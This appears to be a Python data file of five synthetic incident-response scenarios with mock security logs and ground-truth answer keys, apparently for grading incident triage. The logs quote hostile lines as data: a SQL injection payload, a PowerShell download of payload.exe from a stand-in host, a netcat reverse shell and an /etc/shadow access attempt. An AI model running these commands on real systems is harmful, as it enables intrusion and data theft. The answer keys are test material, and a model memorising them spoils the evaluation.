"""
Incident Response Security Logs - Real-world cybersecurity scenarios.

Each incident contains sanitized but realistic security logs from various attack types.
"""

from typing import Dict, List

# Incident scenarios with real-world attack patterns
INCIDENTS = [
    {
        "id": "INC-001",
        "title": "Suspected SQL Injection Attack",
        "severity": "critical",
        "description": "Web application firewall detected suspicious database queries",
        "logs": """
2026-03-28 09:15:32 WAF ALERT: Suspicious SQL pattern detected
Source IP: 185.220.101.42
Target: /api/users/login
Payload: admin' OR '1'='1' --
Response Code: 200
Response Time: 2.3s

2026-03-28 09:15:45 DB_ERROR: Syntax error in SQL query
Query: SELECT * FROM users WHERE username='admin' OR '1'='1' --' AND password='...'
Database: production_db
User: webapp_user

2026-03-28 09:16:02 AUTH_SUCCESS: User 'admin' logged in
Session ID: f3a7b9c2-4e5d-11ec-81d3-0242ac130003
IP: 185.220.101.42
User-Agent: curl/7.68.0

2026-03-28 09:16:15 DB_QUERY: SELECT * FROM customer_data WHERE account_id IN (...)
Rows returned: 15,432
Query time: 0.8s

2026-03-28 09:16:30 DATA_EXPORT: Large data dump initiated
Records exported: 15,432
Format: CSV
Size: 47.2 MB
        """,
        "affected_systems": ["web_server_01", "production_db", "waf"],
        "ground_truth": {
            "attack_type": "sql_injection",
            "attack_vector": "authentication_bypass",
            "severity": "critical",
            "indicators": [
                "sql syntax in login payload",
                "authentication bypass using OR 1=1",
                "unauthorized data access",
                "large data export following breach"
            ],
            "recommended_actions": [
                "block source IP 185.220.101.42",
                "invalidate session f3a7b9c2",
                "review all queries from compromised session",
                "implement parameterized queries",
                "add rate limiting to API endpoints",
                "enable database audit logging"
            ],
            "time_to_detect_minutes": 1,
            "time_to_contain_minutes": 5,
            "data_breach": True
        }
    },
    {
        "id": "INC-002",
        "title": "Ransomware Lateral Movement",
        "severity": "critical",
        "description": "Suspicious file encryption activity detected across multiple hosts",
        "logs": """
2026-03-28 14:22:15 EDR_ALERT: Suspicious process execution
Host: WORKSTATION-047
Process: powershell.exe
Command: Invoke-WebRequest -Uri http://malicious.xyz/payload.exe -OutFile C:\\Temp\\svc.exe
Parent: outlook.exe
User: jsmith

2026-03-28 14:22:45 FILE_CREATION: New executable created
Path: C:\\Temp\\svc.exe
Size: 2.4 MB
Hash: a3f5b2c9d1e7f8a0b2c4d6e8f0a2b4c6
Reputation: UNKNOWN

2026-03-28 14:23:00 PROCESS_START: svc.exe launched
PID: 4728
User: jsmith
Privileges: SYSTEM (privilege escalation detected)

2026-03-28 14:23:30 NETWORK_CONNECTION: Outbound connection
Destination: 203.0.113.45:4444
Protocol: TCP
Data transferred: 45 KB encrypted

2026-03-28 14:24:00 MASS_FILE_MODIFICATION: Bulk file changes detected
Host: WORKSTATION-047
Files modified: 2,847
Pattern: .docx → .docx.locked, .pdf → .pdf.locked
Encryption algorithm: AES-256

2026-03-28 14:25:00 SMB_LATERAL_MOVEMENT: Admin share access
Source: WORKSTATION-047
Target: FILE-SERVER-01, FILE-SERVER-02, DB-SERVER-03
Credentials: Domain Admin (stolen token)

2026-03-28 14:26:00 MULTIPLE_HOSTS_AFFECTED: File encryption spreading
Hosts affected: 15 workstations, 3 file servers
Files encrypted: ~47,000
Ransom note: YOUR_FILES_ARE_ENCRYPTED.txt
        """,
        "affected_systems": ["WORKSTATION-047", "FILE-SERVER-01", "FILE-SERVER-02", "DB-SERVER-03"],
        "ground_truth": {
            "attack_type": "ransomware",
            "attack_vector": "phishing_email",
            "severity": "critical",
            "indicators": [
                "suspicious powershell download from email client",
                "privilege escalation to SYSTEM",
                "command and control communication",
                "mass file encryption",
                "lateral movement via SMB",
                "stolen domain admin credentials"
            ],
            "recommended_actions": [
                "isolate WORKSTATION-047 immediately",
                "block IP 203.0.113.45 at firewall",
                "disable compromised domain admin account",
                "isolate all affected file servers",
                "kill svc.exe process on all hosts",
                "restore from backups (verify backup integrity first)",
                "scan entire network for IoCs",
                "reset all domain admin passwords"
            ],
            "time_to_detect_minutes": 4,
            "time_to_contain_minutes": 15,
            "data_breach": False,
            "business_impact": "high"
        }
    },
    {
        "id": "INC-003",
        "title": "Insider Threat - Data Exfiltration",
        "severity": "high",
        "description": "Employee accessing and transferring sensitive data outside business hours",
        "logs": """
2026-03-28 02:17:00 VPN_CONNECTION: After-hours login
User: mwilson
Source IP: 98.207.44.23 (Residential ISP)
Location: Home address (unusual)
Time: 02:17 AM (outside normal hours: 9 AM - 6 PM)

2026-03-28 02:18:30 FILE_ACCESS: Sensitive directory accessed
Path: \\\\fileserver\\Finance\\Confidential\\Q1_2026
Files accessed: 347
User: mwilson
Department: Marketing (unusual - not authorized for Finance data)

2026-03-28 02:25:00 BULK_DOWNLOAD: Large file transfer detected
Source: \\\\fileserver\\Finance
Destination: C:\\Users\\mwilson\\Downloads
Total size: 2.4 GB
File types: .xlsx, .pdf, .docx
Number of files: 347

2026-03-28 02:35:00 CLOUD_UPLOAD: External file transfer
Service: personal Gmail account (mwilson.personal@gmail.com)
Files attached: Financial_Reports_Q1.zip (2.3 GB)
Recipient: external email address
Classification: CONFIDENTIAL, FINANCIAL

2026-03-28 02:40:00 USB_DEVICE: External storage connected
Device: SanDisk USB 3.0 (32 GB)
Serial: 4C530001234567890123
Files copied: 892 MB

2026-03-28 02:45:00 SECURE_DELETE: File shredding activity
Tool: Eraser (secure deletion software)
Files deleted: 347 temporary files
Location: C:\\Users\\mwilson\\Downloads
        """,
        "affected_systems": ["fileserver", "vpn_gateway", "email_gateway"],
        "ground_truth": {
            "attack_type": "insider_threat",
            "attack_vector": "authorized_access_misuse",
            "severity": "high",
            "indicators": [
                "after hours access",
                "cross-department unauthorized file access",
                "bulk data download",
                "personal email usage for company data",
                "usb device data transfer",
                "evidence destruction via secure delete"
            ],
            "recommended_actions": [
                "disable mwilson account immediately",
                "contact HR and legal teams",
                "review all file access logs for mwilson",
                "attempt recovery of deleted files",
                "contact Gmail to request data preservation",
                "investigate if data was shared further",
                "review and enforce data loss prevention policies",
                "implement stricter access controls for finance data"
            ],
            "time_to_detect_minutes": 480,  # Detected next business day
            "time_to_contain_minutes": 30,
            "data_breach": True,
            "business_impact": "high",
            "legal_implications": True
        }
    },
    {
        "id": "INC-004",
        "title": "DDoS Attack on Production API",
        "severity": "medium",
        "description": "Distributed denial of service affecting customer-facing services",
        "logs": """
2026-03-28 10:00:00 RATE_LIMIT: Unusual traffic spike detected
Endpoint: /api/v1/products
Requests per second: 15,000 (normal: 200-300)
Status codes: 503 (service unavailable) - 87%

2026-03-28 10:00:30 SOURCE_ANALYSIS: Multiple origins detected
Unique IPs: 4,732
Geographic distribution: Worldwide
User-Agents: Mixed (legitimate browsers, curl, python-requests)
Pattern: Distributed attack

2026-03-28 10:01:00 RESOURCE_EXHAUSTION: CPU and memory limits reached
Application servers: 12/12 at 100% CPU
Database connections: 500/500 (max pool)
Response time: 45s (normal: 0.2s)
Error rate: 89%

2026-03-28 10:02:00 CUSTOMER_IMPACT: Service degradation
Failed requests: ~45,000 in last 2 minutes
Customer complaints: 127 support tickets opened
Revenue impact: Estimated $5,000/minute

2026-03-28 10:03:00 ATTACK_PATTERN: Coordinated botnet activity
Request pattern: GET /api/v1/products?id=[random]
No authentication attempts
Header spoofing: Rotating User-Agents
Cookie handling: None (bot-like behavior)

2026-03-28 10:05:00 CLOUDFLARE_ALERT: Attack detected by CDN
Attack volume: 2.3 Gbps
Packet rate: 150,000 pps
Attack type: HTTP flood
Mitigation: Automatically enabled
        """,
        "affected_systems": ["api_servers", "database", "cdn", "load_balancer"],
        "ground_truth": {
            "attack_type": "ddos",
            "attack_vector": "http_flood",
            "severity": "medium",
            "indicators": [
                "massive traffic spike",
                "distributed source IPs",
                "resource exhaustion",
                "bot-like behavior",
                "no authentication attempts",
                "service degradation"
            ],
            "recommended_actions": [
                "enable cloudflare ddos protection",
                "implement rate limiting per IP",
                "add web application firewall rules",
                "scale up api servers temporarily",
                "enable captcha for suspicious traffic",
                "block known botnet IP ranges",
                "monitor for sustained attack",
                "communicate status to customers"
            ],
            "time_to_detect_minutes": 1,
            "time_to_contain_minutes": 10,
            "data_breach": False,
            "business_impact": "medium",
            "financial_impact_usd": 50000
        }
    },
    {
        "id": "INC-005",
        "title": "Privilege Escalation Attempt",
        "severity": "high",
        "description": "Standard user attempting to gain administrative access",
        "logs": """
2026-03-28 16:30:00 AUTH_FAILURE: Repeated failed sudo attempts
Host: LINUX-SERVER-12
User: contractor_bob
Commands attempted: 
  - sudo su -
  - sudo /bin/bash
  - sudo vim /etc/shadow
Failures: 15 attempts in 2 minutes

2026-03-28 16:32:00 EXPLOIT_ATTEMPT: Known vulnerability exploitation
CVE: CVE-2021-4034 (PwnKit)
Binary: /usr/bin/pkexec
Process: Attempting SUID privilege escalation
Detection: Behavioral analysis

2026-03-28 16:32:30 KERNEL_EXPLOIT: Suspicious kernel module load
Module: rootkit.ko
Path: /tmp/.hidden/rootkit.ko
Signature: UNSIGNED
Behavior: Attempting to hide processes

2026-03-28 16:33:00 BACKDOOR_CREATION: Persistence mechanism
Method: SSH key injection
File: /root/.ssh/authorized_keys
Key added: ssh-rsa AAAAB3NzaC...contractor_bob@attacker
Action: Blocked by file integrity monitoring

2026-03-28 16:33:30 SUSPICIOUS_NETWORK: Reverse shell attempt
Destination: 192.0.2.78:31337
Protocol: TCP
Tool: netcat
Command: nc -e /bin/bash 192.0.2.78 31337
Action: Blocked by firewall

2026-03-28 16:34:00 SECURITY_POLICY: Multiple violations detected
User: contractor_bob
Violations: 8 in 5 minutes
Risk score: 95/100 (critical)
Recommendation: Immediate account suspension
        """,
        "affected_systems": ["LINUX-SERVER-12", "identity_management"],
        "ground_truth": {
            "attack_type": "privilege_escalation",
            "attack_vector": "exploit_known_vulnerabilities",
            "severity": "high",
            "indicators": [
                "repeated sudo failures",
                "cve exploitation attempt",
                "rootkit installation attempt",
                "persistence mechanism",
                "reverse shell connection",
                "multiple security policy violations"
            ],
            "recommended_actions": [
                "suspend contractor_bob account immediately",
                "isolate LINUX-SERVER-12 from network",
                "patch CVE-2021-4034 on all Linux servers",
                "scan for rootkit artifacts",
                "review contractor access policies",
                "check for similar activity on other hosts",
                "verify system integrity",
                "review contractor background and contracts",
                "enable enhanced monitoring for contractors"
            ],
            "time_to_detect_minutes": 2,
            "time_to_contain_minutes": 5,
            "data_breach": False,
            "business_impact": "medium",
            "requires_forensics": True
        }
    }
]


def get_incident_by_index(index: int = 0) -> Dict:
    """Get an incident by index with wraparound."""
    return INCIDENTS[index % len(INCIDENTS)]
